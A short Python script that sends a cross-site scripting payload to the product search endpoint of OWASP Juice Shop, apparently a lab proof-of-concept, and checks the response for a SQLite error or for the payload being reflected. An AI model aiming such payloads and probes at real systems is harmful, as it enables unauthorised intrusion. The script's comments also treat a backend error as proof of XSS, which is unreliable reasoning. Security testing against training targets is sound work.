import httpx

# Target URL and payload from confirmed XSS
target_url = "http://juice-shop:3000/rest/products/search"
payload = "<img src=x onerror=alert('XSS_PROOF_67890')>"
params = {'q': payload}

try:
    response = httpx.get(target_url, params=params)

    # Show that payload causes backend error (proving lack of sanitization)
    print("Sending payload in 'q' parameter...")
    print(f"Status Code: {response.status_code}")
    if "SQLITE_ERROR" in response.text:
        print("Backend Error Detected (indicating unsanitized input handling):")
        print(f"Error Snippet: {response.text[:200]}")
    else:
        print("No error detected; checking content...")
        if payload in response.text:
            print("Payload reflected directly.")
        else:
            print("Neither error nor reflection found.")
except Exception as e:
    print(f"Request failed: {e}")
